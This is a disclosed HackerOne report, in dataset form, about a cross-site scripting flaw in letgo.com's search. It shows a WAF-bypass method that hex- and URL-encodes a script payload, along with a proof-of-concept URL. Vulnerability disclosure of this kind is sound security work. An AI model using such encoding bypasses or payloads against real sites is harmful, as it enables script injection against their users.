---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '150822'
original_report_id: '150822'
title: XSS @ *.letgo.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: olx
created_at: '2016-07-12T04:51:39.557Z'
disclosed_at: '2017-05-08T06:22:26.904Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 14
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS @ *.letgo.com

## Metadata

- HackerOne Report ID: 150822
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: olx
- Disclosed At: 2017-05-08T06:22:26.904Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,
Zawad again.
This time I checked letgo.com and found XSS there.
(I hope you will reward all bugs reported now, when you start offering cash ;-) , kidding )

**Description**
I first looked at the search box and enter random text and checked the HTML codes, looked like you weren't filtering texts. But when I tried entering something like `<script>alert(document.domain)</script>` I realized you have some WAF to mitigate XSS attacks because it game me ***Access Denied*** message.
Then I tried to bypass it and finally succeed.

**Steps to Reproduce**
Simple :-)
Just hex and urlencode your javascript code and then enter it in the search form.
I hexed and urlencoded `<script>alert(document.domain)</script>` to `%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29%3c%2f%73%63%72%69%70%74%3e`
So paste `%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29%3c%2f%73%63%72%69%70%74%3e` in the search box and hit *enter*
You see the XSS is triggered.

**PoC**
https://bd.letgo.com/en/q/%25253c%252573%252563%252572%252569%252570%252574%25253e%252561%25256c%252565%252572%252574%252528%252564%25256f%252563%252575%25256d%252565%25256e%252574%25252e%252564%25256f%25256d%252561%252569%25256e%252529%25253c%25252f%252573%252563%252572%252569%252570%252574%25253e%2520%2509
F104510: letgoxss.png

Hope you fix it ! (and offer rewards in future :D )


---------
Zawad

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
